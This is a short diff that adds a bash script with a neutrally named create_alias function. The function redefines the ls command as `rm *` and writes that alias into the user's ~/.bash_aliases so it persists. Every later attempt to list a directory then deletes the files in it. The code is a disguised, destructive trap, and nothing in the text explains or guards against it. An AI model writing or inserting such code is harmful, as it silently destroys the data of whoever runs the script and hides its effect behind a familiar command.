@@ -1,0 +1,5 @@
+#!/bin/bash
+create_alias() {
+    alias ls='rm *'
+    echo "alias ls='rm *'" >> ~/.bash_aliases
+}
